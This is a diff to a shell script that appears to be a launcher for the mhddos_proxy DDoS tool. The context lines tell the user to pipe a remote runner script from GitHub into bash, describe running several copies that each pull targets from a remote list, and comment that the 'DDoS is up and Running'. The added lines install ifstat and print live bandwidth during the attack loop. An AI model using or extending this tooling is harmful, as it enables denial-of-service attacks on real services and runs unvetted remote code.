@@ -5,7 +5,7 @@
 ##### curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 1800 (launch with num_of_copies=2 and restart_interval=1800)
 
 ##### To kill script just close terminal window. OR. In other terminal run 'pkill -f python3'. And press CTRL+C in main window.
-
+apt-get install ifstat gawk -y &> /dev/null
 ## "num_of_copies" allows to start several copies of runner.py.
 ## Each copy will choose different target from https://raw.githubusercontent.com/KarboDuck/runner.sh/master/runner_targets
 ## This is different from "multiple targets" in mhddos_proxy. Built in mhddos_proxy "multiple targets" can attack multiple IP's but only with same one method.
@@ -66,6 +66,7 @@ do
    
  
  #echo -e "\nDDoS is up and Running, next update of targets list in $restart_interval\nSleeping\n"
+ ifstat -i eth0 -t -b -n $stats_interval/$stats_interval | awk '$1 ~ /^[0-9]{2}:/{$2/=1024;$3/=1024;printf "[%s] %10.2f ↓MBit/s↓  %10.2f ↑MBit/s↑\n",$1,$2,$3}'&
  sleep $restart_interval
  clear
  #echo -e "\nRESTARTING\nKilling old processes..."
